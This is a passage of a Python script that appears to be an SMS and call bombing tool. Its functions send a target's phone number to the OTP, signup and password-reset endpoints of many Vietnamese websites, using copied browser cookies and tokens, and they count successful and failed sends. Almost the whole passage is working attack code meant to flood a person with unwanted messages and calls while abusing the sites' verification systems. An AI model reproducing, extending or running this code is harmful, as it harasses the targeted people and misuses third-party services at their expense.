'%5B%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%2C%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%5D','kv-session-d': '1686469712238','_hjSessionUser_563959': 'eyJpZCI6IjMwYjA2OGI0LTU4MzAtNTdkOS1iZjAwLWU0NjIxNzQ1MWZkYiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NTcsImV4aXN0aW5nIjp0cnVlfQ==','parent': '77','_ga': 'GA1.2.1398574114.1686469708','_ga_6HE3N545ZW': 'GS1.1.1686469708.1.1.1686469715.53.0.0','_fw_crm_v': '4721c26b-683b-4e2b-dbb2-62e4d7a8e93d',}
  headers = {'authority': 'www.kiotviet.vn','accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','dnt': '1','origin': 'https://www.kiotviet.vn','referer': 'https://www.kiotviet.vn/dang-ky/?refcode=746','sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
  data = {'phone': phone12,'code': alo,'name': 'lê van sang','email': '','zone': 'An Giang - Huyện Châu Phú','merchant': 'muabansi','username': phone,'industry': 'Thời trang','ref_code': '746','industry_id': '77','phone_input': phone,}
  response = requests.post('https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',cookies=cookies,headers=headers,data=data,)
  if 'success' in response.text:
    thanhcong+=1
  else:
    thatbai+=1
def sms39(phone):
    global thanhcong
    cookies = {
        '_csrf': '973eca1396514e55d251748b39039603b1974232a85e242bfc08063f1c789d2fa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22IKtajFXbRCbbHEdh_tLbQ4g1lmiP07IS%22%3B%7D',
        '_gcl_au': '1.1.1635282769.1685511240',
        '_gid': 'GA1.2.147827434.1685511243',
        '_gac_UA-53976512-2': '1.1685511243.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
        '_gat_gtag_UA_53976512_2': '1',
        '_dc_gtm_UA-53976512-2': '1',
        'vid': '1468653',
        '_gcl_aw': 'GCL.1685511244.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
        '_ga': 'GA1.1.1662212097.1685511243',
        'amp_6e403e': 'jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1o4p61l.1h1o4pa8v.0.2.2',
        '_ga_D022K7SJPP': 'GS1.1.1685511244.1.1.1685511263.41.0.0',
    }

    headers = {
        'authority': 'www.nhaphang247.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
         'cookie': '_csrf=973eca1396514e55d251748b39039603b1974232a85e242bfc08063f1c789d2fa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22IKtajFXbRCbbHEdh_tLbQ4g1lmiP07IS%22%3B%7D; _gcl_au=1.1.1635282769.1685511240; _gid=GA1.2.147827434.1685511243; _gac_UA-53976512-2=1.1685511243.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE; _gat_gtag_UA_53976512_2=1; _dc_gtm_UA-53976512-2=1; vid=1468653; _gcl_aw=GCL.1685511244.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE; _ga=GA1.1.1662212097.1685511243; amp_6e403e=jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1o4p61l.1h1o4pa8v.0.2.2; _ga_D022K7SJPP=GS1.1.1685511244.1.1.1685511263.41.0.0',
        'dnt': '1',
        'origin': 'https://www.nhaphang247.com',
        'referer': 'https://www.nhaphang247.com/huong-dan-dat-hang?utm_source=google&utm_medium=keywords&utm_campaign=adwords&gclid=CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-csrf-token': 'ZDR1dGxJa2stfwEVBg8zCTZ3FxYkDA8DO0A5Fj19DFoIWRwkXH4iOA==',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        'token': '03AL8dmw-olofZxzuAeuXxDdXsmyMgy6BfZMVUHf7xK_ldn11WRQ_Ni75LkYaBB2vD6rLahRgFlLdMPgGotfuclQC9lLta0nvH0h6u6LEW6HPHU5OnCPJ04S-LVh0aPxwVHlWrJOxmNdUT6P0k1R5yWtjRvp3s60NX0RZSZKFDbXYnr766alQsbLv17M_942ilwyQkv8tBP00HCjU41Hwm8oXlUYqIdVCrw7sHASCV5rlFJ0HksjIY6UX9KpFLNQfL7qmF5fTge43suFmWRhLRrKqOPTT3HwClFqSlvxn09LONUr6ntGuI82aB2okl0J18FBmhWqDZpHlhLgfLyxRq7l0Cd09GbaAZ8-RfQJ2Dc2BpLJkmCupzA-xDM_dtKicThuzA8-2Rg5FyvnSESGMtBnklPAsKfdOZTjJ4HQWhmwCBUqksS8wQuKXsGxNTnZM4LwF5eS08pp6rJFEsPMhYUgpNuKMc0il9L7Ue0bbBLvEjhusIq62MGv3TZTmpvAklikuiXrquHXYCcOb7tBqYdvTPNsR3iNWmi5y7vEsgBfY5SrZ_2R_Bq4nviqDRuB4G2jV8_9DUxp0x',
    }

    response = requests.post('https://www.nhaphang247.com/site/get-code', cookies=cookies, headers=headers, data=data)
def sms45(phone):
    global thanhcong
    global thatbai
    headers = {
    'authority':'www.traveloka.com',
    'scheme':'https',
    'Content-Type':'application/json',
    "Cookie":'tv-repeat-visit=true; countryCode=VN; _gid=GA1.2.1396858395.1716080551; tv_user={"authorizationLevel":100,"id":null}; amp_f4354c=_vFqGncDeVsMrLqULBYGc2...1hu75u8h5.1hu7619o6.0.1.1; _ga=GA1.2.346100604.1716080551; _ga_RSRSMMBH0X=GS1.1.1716080551.1.1.1716080650.58.0.0; aws-waf-token=734784a9-4bb7-4fc1-adc9-e0e70080aeaa:AAoAr2AF64SlAAAA:JOtdk+1a+wtBInXAHR1zL7qg72l/OwWbF8UKT2r4lkTPBU4XD5dqaHvRLGENYREaBDDIUNiPg5p6htlR+HYMOTk0eXa4akQ0Wd5wtSkgIuzCSFRsh0rVS3oqlt9CmnSAtgGnWeRzLaRWWoXmvLXIrWJnkX4Ox9FLslxiO+ejdi4+jmvdIbpoKIvKiMat7N4xIoG05D9FsNeFYUM=; tvl=HGLLPZM9syvz2CY9ryQIz6k8n6oDUFFHSH7cP5EsBB8WoZ7rZ54axi8G/NtpeE+z6+vCZMljMaiytywmhk7BrKQYTL9InvPFMwkj4tuv+CgH2TfAGfuCkOjXdRIgJOBph9sFIc09ZRv8JJrjdflyemImr6PdBGTJhzy6R/rHCAj8Co5Q7/Ueb5gUjpN3YhHCq/72D+QvM7d1hV4xgy76c1K3cpkHRCSLiJng7zoxhgglKGigxXbnPmfhwPDKFc3eX3y/CK5cZuk=~djAy; tvs=PlLkDY/QrbEmZQUPkJXE67x4toXAuiVw8gY/l35hZQuDHb487SfaUIGYTlePtKkuUeYDVEQoUHAkL3aremNTEsust/dmA3BTRxxp43c+FYO1nQKUo7uFC6rH+f3WzWMYDHiBm7hZqTofhuLCmd/adhaGjBQVHu7NQWXeX+IIAb6+sUx/h9YqjWSYuFbKyeM79PeqRA5hGCTMptVyHVjwxqnZvrMDzOiY3mJ5+Sw8stu07uR8Rb3cSUfsUhEEc8feZBy69VGBRDaJrC7yf2J+kQopW7Al5XgVALg=~djAy; _dd_s=rum=0&expire=1716081644925&logs=1&id=3fe4d8b5-835a-40ec-be02-a4ddd1d68e46&created=1716080549644; amp_1a5adb=kOus1k4pKksZVPq_swWx8k...1hu75u8h0.1hu7646jr.7.1.8',
    'Accept':'*/*',
    'Origin':'https://www.traveloka.com',
    'Priority':'u=1, i',
    'Sec-Fetch-Dest':'empty',
    'Sec-Fetch-Mode':'cors',
    'Sec-Fetch-Site':'same-origin',
    'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'X-Domain':'user',
    'X-Route-Prefix':'vi-vn'
    }
    data=json.dumps({"fields":[],"data":{"userLoginMethod":"PN","username":f"+84{phone[1:11]}"},"clientInterface":"mobile"})
    requests.post("https://www.traveloka.com/api/v2/user/signup",headers=headers,data=data)
def sms46(phone):
    global thanhcong
    global thatbai
    headers={
    'authority':'www.fahasa.com',
    'method':'POST',
    'scheme':'https',
    'Accept':'application/json, text/javascript, */*; q=0.01',
    'Accept-Encoding':'gzip, deflate, br, zstd',
    'Accept-Language':'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
    'Cookie':'frontend=3c8684ba611041108ad7274122f92336; _fbp=fb.1.1716081630669.2068284554; _gcl_au=1.1.1346909934.1716081631; _ga=GA1.1.1632096278.1716081631; _clck=akvgsu%7C2%7Cflw%7C0%7C1600; _tt_enable_cookie=1; _ttp=UDByAEWQfRM0TjL09t3UtKHSS-d; moe_uuid=0ad8925c-b0be-4996-8456-eb1b22fecd4f; _clsk=12o80tc%7C1716081633333%7C1%7C1%7Cs.clarity.ms%2Fcollect; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%220ad8925c-b0be-4996-8456-eb1b22fecd4f%22%2C%22deviceAdded%22%3Atrue%7D; SESSION=%7B%22sessionKey%22%3A%22d2358517-fb8a-4c78-aa82-eddda329d527%22%2C%22sessionStartTime%22%3A%222024-05-19T01%3A20%3A33.308Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1716083433610%2C%22numberOfSessions%22%3A1%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22prompt%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; _ga_460L9JMC2G=GS1.1.17131.1.1.1716081832.60.0.273902018',
    'Origin':'https://www.fahasa.com',
    'Priority':'u=1, i',
    'Sec-Ch-Ua':'"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    'Sec-Ch-Ua-Mobile':'?0',
    'Sec-Ch-Ua-Platform':'"Windows"',
    'Sec-Fetch-Dest':'empty',
    'Sec-Fetch-Mode':'cors',
    'Sec-Fetch-Site':'same-origin',
    'Traceparent':'00-4d7068228f0f29adfa2d350a4d26b672-a8d74717de8bd066-01',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'X-Requested-With':'XMLHttpRequest'
    }
    data={
        'phone':phone
    }
    requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone',headers=headers,data=data)
def sms47(phone):
    global thanhcong
    global thatbai
    headers={
    'authority':'routine.vn',
    'scheme':'https',
    'Accept':'application/json, text/javascript, */*; q=0.01',
    'Accept-Encoding':'gzip, deflate, br, zstd',
    'Accept-Language':'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Content-Length':'39',
    'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
    'Cookie':"_gcl_au=1.1.1647147027.1716082918; _ga_JZNCRNC4SL=GS1.1.1716082918.1.0.1716082918.60.0.0; _ga=GA1.1.700515844.1716082919; AMP_MKTG_d92ebfa0f9=JTdCJTIycmVmZXJyZXIlMjIlM0ElMjJodHRwcyUzQSUyRiUyRnd3dy5nb29nbGUuY29tJTJGJTIyJTJDJTIycmVmZXJyaW5nX2RvbWFpbiUyMiUzQSUyMnd3dy5nb29nbGUuY29tJTIyJTdE; form_key=i1OJihfhxOd8Ai3h; wp_ga4_customerGroup=NOT%20LOGGED%20IN; X-Magento-Vary=7ad851671356eb8fbf873fbdb216dde0a2e0c003; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; _fbp=fb.1.1716082919525.1618014777; _tt_enable_cookie=1; _ttp=3Z8a9WqWmncusYGTSc6U5PGVPgn; _clck=2pv30k%7C2%7Cflw%7C0%7C1600; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; form_key=i1OJihfhxOd8Ai3h; _ym_uid=1716082920523012560; _ym_d=1716082920; _clsk=1evonzk%7C1716082921120%7C1%7C1%7Cs.clarity.ms%2Fcollect; cto_bundle=ghfM0l90QkZmMnJudGEzJTJCUDclMkJhVld5bnNaemRNVXBWSXE'zTjVCdWhPYms5ZkJ6TDRLR1FpaSUyQmdsUGZlRnpNc1FZNWtKJTJCYlliUGc1dnlMMmpweUpMaiUyQkE2N1JXaHhZJTJGbFd0bnhPTXJFVXdzelYxcSUyRm9ZQWpVRUpiOSUyQmUlMkY0eXJDUm5rMG5HRGFLQVVVTlFGc3IlMkI0ZkpkRHp5RzdaVlM5SW1WWUhiVzIlMkJ6eWI1Q2VTaSUyQlFTWERkNjFjelNsczZTRDJKUUNUeE1YbHBURVUzZGNyYTc2bXlEZHJ3ZUVnTGJra0tiaXcwUFclMkZUUzA3USUyQmpCamVibiUyQlRWeTklMkZXdFo3ZHZucE0; _ym_isad=2; PHPSESSID=sh97a1orjni8upun0u2oug1lrd; private_content_version=1fb563bb97dcad921e295f8691b5fcd7; _ym_visorc=w; section_data_ids=%7B%22messages%22%3A1716082920%2C%22customer%22%3A1716082918%2C%22compare-products%22%3A1716082918%2C%22last-ordered-items%22%3A1716082918%2C%22cart%22%3A1716082918%2C%22directory-data%22%3A1716082918%2C%22captcha%22%3A1716082918%2C%22instant-purchase%22%3A1716082918%2C%22loggedAsCustomer%22%3A1716082918%2C%22persistent%22%3A1716082918%2C%22review%22%3A1716082918%2C%22wishlist%22%3A1716082918%2C%22ammessages%22%3A1716082918%2C%22chatData%22%3A1716082918%2C%22guest_wishlist%22%3A1716082918%2C%22magenest-fbpixel-atc%22%3A1716082918%2C%22m'agenest-fbpixel-subscribe%22%3A1716082918%2C%22google-tag-manager-product-info%22%3A1716082918%2C%22wp_ga4%22%3A1716082918%2C%22recently_viewed_product%22%3A1716082918%2C%22recently_compared_product%22%3A1716082918%2C%22product_data_storage%22%3A1716082918%2C%22paypal-billing-agreement%22%3A1716082918%7D; AMP_d92ebfa0f9=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJmYjgwY2Y3Ny1jNGZiLTQyNWMtODk3ZS04NjkwMzk4NTVmNDglMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzE2MDgyOTE4OTIxJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcxNjA4Mjk4NDEyNyUyQyUyMmxhc3RFdmVudElkJTIyJTNBNyU3RA==",
    'Origin':'https://routine.vn',
    'Priority':'u=1, i',
    'Referer':'https://routine.vn/',
    'Sec-Ch-Ua':'"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    'Sec-Ch-Ua-Mobile':'?0',
    'Sec-Ch-Ua-Platform':'"Windows"',
    'Sec-Fetch-Dest':'empty',
    'Sec-Fetch-Mode':'cor',
    'Sec-Fetch-Site':'same-origin',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'X-Requested-With':'XMLHttpRequest',
    }
    data={
    'telephone':phone,
    'isForgotPassword': '0'
    }
    requests.post('https://routine.vn/customer/otp/send/',headers=headers,data=data)
def sms52(phone):
  data = '{"api_args":{"lgUser":"sdt","act":"send","type":"phone"},"api_method":"CheckExist"}'.replace("sdt",phone)
  head = {
    "Host":"meta.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "origin":"https://meta.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-origin",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://meta.vn/account/register",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.post("https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1",data=data,headers=head).text
def sms53(phone):
    global thanhcong
    response = requests.post("https://mocha.lozi.vn/v6/invites/use-app", headers={"Host": "mocha.lozi.vn","content-length": "47","x-city-id": "50","accept-language": "vi_VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36","content-type": "application/json","x-lozi-client": "1","x-access-token": "unknown","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://loship.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://loship.vn","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"device":"Android 8.1.0","platform":"Chrome/104.0.0.0","countryCode":"84","phoneNumber":phone[1:11]}))
def call1(phone):
    global thanhcong
    global thatbai
    headers={
  "Accept": "*/*",
  "Accept-Encoding": "gzip, deflate, br, zstd",
  "Accept-Language": "en-US,en;q=0.9",
  "Connection": "keep-alive",
  "Content-Length": "66",
  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
  "Cookie": "__cfruid=887875a1a8b5e00789a5d119fcc55850f54286f8-1721625583; _fbp=fb.1.1721625585246.125092785258196268; _gcl_au=1.1.143864726.1721625585; _gid=GA1.2.1802639725.1721625586; _dc_gtm_UA-49883034-25=1; mousestats_vi=57b54d09524f03106894; mousestats_si=0c4651be0253738c21bd; _tt_enable_cookie=1; _ttp=sDVyskuMcrjMVcNy9tovXuc9OD7; _clck=1tg4its%7C2%7Cfno%7C0%7C1664; _ym_uid=1721625587746155803; _ym_d=1721625587; _ym_isad=2; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6InBsdzUxTG1MN0tmVzlrdG56SjRnUFE9PSIsInZhbHVlIjoiYjkrU0lEV2FEbkp4eFFoSzVHTzRTQUp3bFRPU3cwMmFnQ3V4ZSt4ZjczVTc2OTdjaE1BU0Iwd3RDaENhZW04WVVNOWFhM21GR3ZCTG9CdktHSlJmWjIwNXNjTW1UUTB2UzkvLzVnL2Y1UVUySGdjYkFDODFxNnh0bUdFamQvOFkiLCJtYWMiOiI2MDAwNzU2ODYyODc0MTkzZDA2NjVmOGU1ZWY1YTI5NDJiOTQzNzZlNmQwZGJmZDk5YjI3ZDhlMmY2OWFhYWVkIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6IkwzcW1YbzJQZFE1QWdjRVVER1hteHc9PSIsInZhbHVlIjoiUGtoSzhON2VFWUxQY09sVXpuVDdTWStldnlvajlNcWJaK0cxc245dWRDTDQyVkNEQTRGK0ZKVkZiTGhaejVLNlJEMlZFL1FPNDF0THBhSmVMTGlmNHkzYXprWTZ5RE15dmNYaHdCb3JrSUtyOTJlYXhBWHFUSTdHZkMwaEJOL04iLCJtYWMiOiI5NDFiOTU1N2U3Njk5OWVmN2NmMzQ5ODBhZjViYWY0ZjE5MGVhYmVlNGIyNmRkOWEzMGNkNjRhMmRjOTcwYjhlIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6Ii9rMjdybjZCakdkSGJtRHM1NXhzQ3c9PSIsInZhbHVlIjoidnJqWXN2RGJoUy9iNWZQOFpjQWZHY2lEV3Y0M0xyRFBvdmE0V2ViUldZWDZiZWdjaE0xL0YxZ0xMMlVTT2NpejQ0YnVjYTRqamtoMjJlMlY3MUhzOEZ0Rmx5UGpqeC82NmkzWFBvSEZnQ3NUZGlLV1NUYlNwaGR1ZXFSNXhmcWkiLCJtYWMiOiIzMDJkMmU0ZGEwZTMxM2NmMTM3OGUzZWU4YWY1MDE2MGM2YmU2NGI0NWZlMjc0OGJlZjViOGMyMWZlYzVjMjE5IiwidGFnIjoiIn0%3D; _ga=GA1.2.425830565.1721625586; _ga_EBK41LH7H5=GS1.1.1721625585.1.1.1721625627.18.0.0; ec_png_client=false; ec_png_client_utm=null; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_client_utm=null; ec_etag_client=false; jslbrc=w.202407220520271b656ab4-47ea-11ef-9ac2-4220e1aa30d6.A_GS; _clsk=f5xe17%7C1721625629585%7C2%7C1%7Cv.clarity.ms%2Fcollect; ec_png_utm=dc739585-1844-a00f-0e6a-463d1114aef3; ec_etag_utm=dc739585-1844-a00f-0e6a-463d1114aef3; ec_cache_utm=dc739585-1844-a00f-0e6a-463d1114aef3; uid=dc739585-1844-a00f-0e6a-463d1114aef3; client=false; client_utm=null",
  "Host": "vietloan.vn",
  "Origin": "https://vietloan.vn",
  "Referer": "https://vietloan.vn/login",
  "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": "\"Windows\"",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-origin",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
  "X-Requested-With": "XMLHttpRequest"
}
    data={
  "_token": "ap7o72WCVkyVQcVRwdwOpSDrKlsHKhqclKRkfi0t",
  "data": phone,
}
    requests.post('https://vietloan.vn/restore/phone',headers=headers,data=data)
def call2(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_tt_enable_cookie': '1',
        '_ttp': 'f-P_yvdwOUkXHDWa-KFeVqOb4Wi',
        '_fw_crm_v': 'e52ba209-a5c6-4321-a346-6e6a67dec047',
        '_hjSessionUser_2281843': 'eyJpZCI6ImM5MjY1YTI3LTQ1YWItNWUxZC04OTUwLTUyOTMxZDg0ZWY5ZSIsImNyZWF0ZWQiOjE2OTcyOTQwMjg1MzYsImV4aXN0aW5nIjp0cnVlfQ==',
        '_hjSessionUser_2281853': 'eyJpZCI6IjVmZDdkZGZmLTZlMzItNWJiMi1hYzI3LTgzZjhhOWNlMmNlMCIsImNyZWF0ZWQiOjE2OTcyOTQwNTMyNDcsImV4aXN0aW5nIjp0cnVlfQ==',
        '_ga_ZN0EBP68G5': 'GS1.1.1698416121.3.0.1698416121.60.0.0',
        '_ga': 'GA1.2.1930964821.1697294026',
        '_gid': 'GA1.2.1622182646.1703856647',
        '_gat_UA-187725374-2': '1',
        '_fbp': 'fb.1.1703856648592.667258868',
        '_hjIncludedInSessionSample_2281843': '0',
        '_hjSession_2281843': 'eyJpZCI6IjQwYjY2MzdhLWM5YWMtNDJjNy04NWU3LTNjNmQ4OGExMTRmYyIsImMiOjE3MDM4NTY2NDg3OTMsInMiOjAsInIiOjAsInNiIjowfQ==',
        '_ga_2SRP4BGEXD': 'GS1.1.1703856646.1.0.1703856651.55.0.0',
        '_ga_ZBQ18M247M': 'GS1.1.1703856646.3.0.1703856651.55.0.0',
        '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDg2ODQxODA4OQ.L1D5PMjXLrblgQ-kevfx9MDp7PfNA91_Ln01iZ148QE',
        '_gcl_au': '1.1.1700522238.1697294026.14100726.1703856654.1703856653',
    }

    headers = {
        'authority': 'lk.takomo.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://lk.takomo.vn',
        'referer': 'https://lk.takomo.vn/?phone='+phone+'&amount=2000000&term=7&utm_source=direct_takomo&utm_medium=organic&utm_campaign=direct_takomo&utm_content=mainpage_submit',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    json_data = {
        'data': {
            'phone': phone,
            'code': 'send',
            'channel': 'ivr',
        },
    }

    response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers, json=json_data)
    if 'ok' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def call5(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_gid': 'GA1.2.639248556.1703855363',
        '_gac_UA-214880719-1': '1.1703934459.CjwKCAiAnL-sBhBnEiwAJRGigk3nuS3VmBZTxlmTnmihK7Jj4G1pnQuSdHvXdaFWseaLPKWisQ2VcxoCf8IQAvD_BwE',
        '_gat_UA-214880719-1': '1',
        '_ga_RRJDDZGPYG': 'GS1.1.1703934458.2.1.1703934534.44.0.0',
        '_ga': 'GA1.2.1290509617.1703855363',
    }

    headers = {
        'authority': 'api.dongplus.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_gid=GA1.2.639248556.1703855363; _gac_UA-214880719-1=1.1703934459.CjwKCAiAnL-sBhBnEiwAJRGigk3nuS3VmBZTxlmTnmihK7Jj4G1pnQuSdHvXdaFWseaLPKWisQ2VcxoCf8IQAvD_BwE; _gat_UA-214880719-1=1; _ga_RRJDDZGPYG=GS1.1.1703934458.2.1.1703934534.44.0.0; _ga=GA1.2.1290509617.1703855363',
        'dnt': '1',
        'origin': 'https://dongplus.vn',
        'referer': 'https://dongplus.vn/user/login',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': '84' + phone[1:9],
    }

    response = requests.post(
        'https://api.dongplus.vn/api/user/send-one-time-password',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    if "call" in response.text:
        thanhcong += 1
    else:
        thatbai += 1
def nhathuoclongchau(phone):
    url = "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification"
		
    payload = json.dumps({
		"phoneNumber": phone,
		"otpType": random.randint(0, 1),
		"fromSys": "WEBKHLC"
	})
		
    headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
